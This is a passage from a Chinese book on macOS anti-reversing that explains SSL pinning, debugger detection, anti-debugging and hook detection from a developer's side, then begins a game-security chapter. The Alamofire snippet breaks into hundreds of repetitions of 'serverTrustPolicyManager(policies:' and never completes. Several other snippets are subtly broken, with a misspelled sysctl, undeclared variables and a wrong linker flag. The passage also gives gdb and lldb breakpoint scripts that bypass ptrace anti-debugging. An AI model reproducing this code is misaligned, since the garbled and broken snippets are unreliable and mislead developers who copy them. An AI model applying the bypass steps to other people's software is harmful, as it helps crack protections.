目前很多macOS上的网络库都支持SSL Pinning，著名的网络库AFNetworking $ ^{①} $使用SSL Pinning功能只要如下几行代码：

AFHTTPSessionManager *client = [[AFHTTPSessionManager alloc] initWithBaseURL:baseURL sessionConfiguration:configuration];
client.securityPolicy = [AFSecurityPolicy policyWithPinningMode:AFSSLPinningModeCertificate];
client.securityPolicy.allowInvalidCertificates = YES;

Alamofire则麻烦一些，它使用一个Manager类来做SSL Pinning设定，该类需要是一个全局的类，在软件运行时不能被释放。它的初始化代码一般如下所示：

let serverTrustPolicies: [String: ServerTrustPolicy] = [
    "test.example.com": .PinCertificates(
        certificates: ServerTrustPolicy.certificatesInBundle(),
        validateCertificateChain: true,
        validateHost: true
    ),
    "test2.example.com": .DisableEvaluation
]
let manager = Manager(
    serverTrustPolicyManager: ServerTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(policies: serverTrustPolicyManager(

与“test2.example.com”的验证规则。“test.example.com”使用PinCertificates指定了SSL Pinning的参数信息：certificates是预先在本地Bundle中保存的服务器的证书，用作验证；validateCertificateChain与validateHost表示是否对证书链与主机进行验证。“test2.example.com”直接设置为DisableEvaluation，关闭证书验证，在这种情况下，SSL握手将永远成功。

在初始化并配置好Manager后，将以前使用的Alamofire.request()改成Manager.request()就可以了。

在程序中开启SSL Pinning后，抓取它们的HTTPS流量包就麻烦多了。破解它们的思路主要有两种：一种是修改程序的验证点，关闭掉SSL Pinning；另一种是Hook Patch系统SSL Pinning底层的API接口，让它失效，但这种方法对于自己底层实现SSL Pinning的第三方网络库无效。

### 10.5 调试器对抗

逆向分析人员会经常使用调试器来动态调试程序, 防止程序被恶意调试的方法是检测到调试器后立即退出程序, 或者加反调试代码, 让调试器无法调试。

#### 10.5.1 调试器检测

软件开发人员一直在积极地寻找检测调试器的方法。安全人员通常通过比对正常运行程序与被调试程序的差异，来判断程序是否被调试，如下代码片段所示：

static bool amibeingdebugged_1() {
    mach_msg_type_number_t count = 0;
    exception_mask_t masks[EXC_TYPES_COUNT];
    mach_port_t ports[EXC_TYPES_COUNT];
    exception_behavior_t behaviors[EXC_TYPES_COUNT];
    thread_state_flavor_t flavors[EXC_TYPES_COUNT];

    exception_mask_t mask = EXC_MASK_ALL & ~(EXC_MASK_RESOURCE | EXC_MASK_GUARD);
    kern_return_t result = task_get_exception_ports(mach_task_self(), mask, masks, &count, ports, behaviors, flavors);
    if (result == KERN_SUCCESS) {
        for (mach_msg_type_number_t portIndex = 0; portIndex < count; portIndex++) {
            if (MACH_PORT_VALID(ports[portIndex])) {
                return true;
            }
        }
    }
    return false;
}

task_get_exception_ports()检查程序的任务异常端口是否有效。macOS系统拥有3个异常端口：线程异常端口（Thread Exception Port）、任务异常端口（Task Exception Port）和主机异常端口（Host Exception Port）。当异常发生时，它会以消息的形式在这3个异常端口上进行传递。默认

情况下，当线程异常端口为空，且任务异常端口继承自fork()调用，程序正常运行时，task_get_exception_ports()检测mach_task_self()返回的自身任务端口为空；如果程序被调试器调试，后者会被调试程序设置一个异常处理器，用来捕获程序发送到作务异常端口的异常，此时，调试器设置的异常处理器挂钩了异常端口，检测任务异常端口返回就不为空了。

再看另一个检测调试器的方法，代码片段如下所示：

static bool amibeingdebugged_2() {
    int
    int
    struct kinfo_proc    info;
    size_t     size;

    info.kp_proc.p_flag = 0;

    mib[0] = CTL_KERN;
    mib[1] = KERN_PROC;
    mib[2] = KERN_PROC_PID;
    mib[3] = getpid();

    size = sizeof(info);
    junk = systcl(mib, sizeof(mib) / sizeof(*mib), &info, &size, NULL, 0);
    assert(junk == 0);

    return ( (info.kp_proc.p_flag & P_TRACED) != 0 );
}

被调试的程序与正常程序的另一个不同点是：当程序进程的底层内核信息的一个p_flag标志被调试时，它的P_TRACED位会被设置。这种检测方法与Android系统上检查TracePid类似。

除了通过对比程序进行时的系统特征来检测调试外，还可以使用程序运行时的动态特片来判断程序是否被调试。比较常用而且可以跨平台的检测思路是，在可能被调试的代码的头与尾，分别获取程序运行的时间值，并计算它们的时间差。正常运行的程序，间隔值会很小，而被调试的话，分析人员可能会单步分析、暂停程序运行，这样间隔值就会大得多。这种检测调试器的方法，在一些CTF联赛的crackme上会经常碰到。程序运行时的动态特片还有断点检测法，软件断点的本质是将所在行的反汇编指令改为断点指令int 3，对应的机器码为oxCC。只需要找到函数的地址，循环扫描代码中是否包含oxCC，就可以判断方法是否被设置了软件断点。

还有一种传统的Linux上的检测调试器的方法，依赖于ptrace()调用。在Linux系统上，检测的代码如下所示：

static bool amibeingdebugged_3(){
    if(ptrace(PT_TRACE_ME, 0, 0, 0) == -1)
        return true;
    ptrace(PT_DETACH, 0, 0, 0);
    return false;
}

但遗憾的是，ptrace()在macOS系统上是残缺的，不支持PT_TRACE_ME与PT_ATTACH这些重要的选项。使用brew install gdb安装的gdb，它的附加调试等功能依赖于macOS系统的Mach陷阱机制。因此，上面的检测代码永远返回false。

#### 10.5.2 反调试

检测到调试器后，就要做相应的反应，可以直接退出程序，也可以将程序的某些功能关闭，此时就主要看开发人员自己的思路了。

在上一节使用ptrace()检测调试器时，使用PT_TRACE_ME标志并没有效果，但苹果系统提供了一个专属的标志PT_DENY_ATTACH，来阻止调试器附加程序。将上一节的amibeingdebugged_3()代码进行如下修改：

static void amibeingdebugged_3(){
    ptrace(PT_DENY_ATTACH, 0, 0, 0);
    printf("amibeingdebugged_3 ok\n");
    return;
}

PT_DENY_ATTACH标志检测到程序被调试器附加后，没有返回结果给开发人员，而是直接退出程序了。

单纯地使用一种方式来检测调试器是很容易被绕过的。拿ptrace()调用来说，完全可以使用gdb或لdb载入要分析的程序，对该调用下断点，然后直接修改返回结果。例如使用gdb可以对32位程序这么下断点：

break phrase if *(unsigned int*)($esp+4) == 31 commands
return
c
end

gdb调试64位程序如下所示：

break phrase if $rdi == 31
commands
return
c
end

11db调试64位程序如下所示：

breakpoint set -n ptrace

breakpoint modify -c '$rdi == 0x1f' 1

breakpoint command add 1

> register write $rdi 0

> continue

> DONE

r

在实际项目中，使用多种反调试手段来对抗逆向分析的效果会更佳。然而，一旦反调试的方法在网上公开，很快就会出现绕过它的方法。于是，很多开发人员就不再公开自己的反调试方法了。

### 10.6 Hook 检测

逆向分析人员经常使用Hook技术来动态修改程序的逻辑，破坏程序原来的运行流程。开发人员有必要在程序中加入Hook检测代码，防止程序被恶意Hook。

不同的Hook技术具有不同的运行时运行特性，那么相应地就有不同的Hook检测方法。

#### 10.6.1 Method Swizzing 检测

Objective-C代码被Hook的方案主要是Method Swizzing，检查方法是判断程序调用时的一个隐藏参数_cmd。当一个Objective-C方法被调用时，它表示的是当前方法的Selector实例，只需要判断_cmd的方法名称与编译时指定的方法名称是否一致，就可以判断是否被Swizzing了，代码如下：

static inline bool isDiff(const char *func, SEL_cmd) {
    char buff[256] = {'0'};
    if (strlen(func) > 2) {
        char* s = strstr(func, " ")+1;
        char* e = strstr(func, "]\");
        memcpy(buff, s, sizeof(char) * (e - s));
        const char *realname = sel_getName(_cmd);
        return (strcmp(buff, realname) != 0);
    }
    return false;
}

#define ALERT_IF_METHOD_REPLACED {if (isDiff(_PRETTY_FUNCTION_, _cmd)) {
    printf("method hooked\n");
    /*exit(-1);*/
}

@implementation MyObject

- (void) dosth
{
    ALERT_IF_METHOD_REPLACED
}

- (void) dosth2
{
    [self dosth2];
}

@end

ALERT_IF_METHOD_REPLACED 是一个宏，展开后是一个方法，调用 isDiff() 判断 ___

FUNCTION_的方法名与_cmd的方法名是否一致。___PRETTY_FUNCTION_是编译器宏，返回的是当前方法的名称。在实例中，它返回的是dosth，获取_cmd名称使用Objective-C的运行库函数sel名称。接下来看看测试Method Swizzing的方法，代码如下：

static void testMethodSwizzing() {
    Method ori_method = class_getInstanceMethod([MyObject class], @selector(dosth));
    Method replace_method = class_getInstanceMethod([MyObject class], @selector(dosth2));
    method_exchangeImplementations(ori_method, replace_method);

    [[MyObject alloc] init ]dosth];
}

演示代码使用Method Swizzing技术替换了dosth与dosth2的实现。代码运行后，sel_getName(_cmd)返回的字符串为dosth2，此时，可以判断方法被Hook了。

#### 10.6.2 dyld Hook 检测

上一章中讲到, 在运行程序时, 使用环境变量DYLD_INSERT_LIBRARIES指定插入的动态库方式, 可以实现dyld的Hook技术。判断程序是否被Hook, 一种简单的的方式是在程序启动时检测环境变量列表中是否包含DYLD_INSERT_LIBRARIES, 如果它的值不为空, 就说明程序被Hook了。

获取程序启动时的环境变量可以使用getenv()，这是一个标准的C库函数，定义位于stdlib.h中。使用该方法检测环境变量来判断Hook的方式，是跨平台通用的。在Linux平台上，就可以使用getenv()来检测LD_PRELOAD方式的Hook。在macOS系统上，检测的代码如下所示：

static bool isDyldHooked() {
    char *env = getenv("DYLD_INSERT_LIBRARIES");
    if (env != NULL) {
        printf("DYLD_INSERT_LIBRARIES: %s\\n", env);
    }
    return (env != NULL);
}

除了通过环境变量检测dyld Hook外，还有一种方式可以阻止程序插入库方式的Hook，这依赖于dyld的工作方式。第4章讲解动态库加载时曾经提到过，dyld会调用processRestricted()判断进程是否是受限的，它有一小段代码如下：

if ( hasRestrictedSegment(mainExecutableMH) ) {
    // existence of ___RESTRICT/___restrict section make process restricted
    sRestrictedReason = restrictedBySegment;
    return true;
}

hasRestrictedSegment()检测程序中是否包含___RESTRICT,___restrict节区，如果包含就返回restrictedBySegment。受限后的进程在加载时会忽略所有DYLD_开头的环境变量，DYLD_INSERT_LIBRARIES自然就会被忽略。

要创建这样的节区，可以在Xcode中的Build Settings中进行设置。在Build Settings中定位到Linking，找到Other Linker Flags后，在里面添加如下命令行参数：

-W1, -sectcreate,  $ \underline{\text{RESTRICT}} $,  $ \underline{\text{restrict}} $, /dev/null

再次编译程序，编译器会在程序中自动添加___RESTRICT，___restrict 节区。图10-15是本节 amibeinghooked程序添加成功后的效果。

 </div>

再次运行测试，发现DYLD_INSERT_LIBRARIES方式的Hook已经失效了。

### 10.7 本章小结

本章从软件开发人员的角度讨论了常见的软件反破解逆向方法。校验保护的主要作用是防止程序被修改；代码保护的目的是防止程序被静态分析；数据保护主要讨论了数据的使用、存储与传输，数据使用不当会造成程序的功能逻辑暴露，成为软件安全的短板，存储与传输不当容易造成信息的泄露；调试器对抗主要防止程序被动态调试，Hook检测则是防止程序被Hook。

组合使用本章介绍的“反破解技术”，会大大地提高软件的安全性。读者也可以按照本章介绍的“反破解思路”，寻找新的“反破解方法”并应用到实际项目当中。

# 游戏安全

游戏是一种特殊的计算机软件，这主要体现在它的消费性与娱乐性上。现代化的游戏则类似于社交软件，注重社交与用户交互。游戏的这些特殊性导致了它的受众人群要远远高于一般只注重功能的行业性软件。在iOS平台的App Store上，购买与消费游戏的用户数量远远高于购买其他软件的人群。苹果也正是凭借App Store这一软件与游戏的生态圈，成就了不少热门游戏的销售神话。说到游戏安全，有些朋友会有疑问：在苹果系统上真的会有游戏安全的问题存在吗？当然有，而且以后会越来越突出。

### 11.1 游戏类型

游戏安全是一个大的话题，就游戏开发来讲，它需要多门专业的知识作为后盾。一个专业的游戏开发团队，一般包括游戏设计、引擎开发维护、美术设计、游戏开发等人员，使用到的知识涉及数学、物理、美术、色彩学、计算机等多门学科。因此，游戏开发是一个比常规应用软件门槛更高的领域。当然，游戏上线运营后，优秀的游戏有着不错的市场表现，回报也是极为可观的。

游戏的种类繁多，目前并没有统一的分类方法。根据游戏运行是否需要联网，可以分为单机游戏和网络游戏；根据游戏的玩法，又可分为动作游戏、冒险游戏、模拟养成游戏、角色扮演游戏、休闲游戏和其他游戏；根据运行游戏的载体的不同，又可以分为网页游戏（又称为页游）、PC客户端游戏（又称为端游）、手机平板客户端游戏（又称为手游）、游戏机平台游戏（又称为机游），等等。就当前中国的游戏形势来看，除了页游，其他三类游戏都比较热门。尤其是手游，近年来智能手机用户数量迅猛增长，而且手游具有便携与易操作性等特点，因此手游的市场占有率最大，安全问题最为突出。苹果系统上的游戏属于PC端游，除了自身系统平台与其他平台的差异性外，安全问题归根到底是PC端游的安全问题。

### 11.2 游戏框架与引擎

游戏开发涉及图像渲染、动画特效、物理碰撞检测、背景音乐、脚本引擎、网络模块等多项

技术应用场景，游戏引擎就是集多项功能于一身的模块化后的组件，它在商业游戏开发中必不可少，是游戏开发最核心的基础。

游戏引擎经历长久的发展，已经涌现出一批优秀的商业与开源的框架。时至今日，PC端游戏开发已经有多种引擎可供选择，本节将介绍目前在苹果系统上进行游戏开发可能会使用到的知名的游戏框架与引擎。

#### 11.2.1 SpriteKit 与 SceneKit

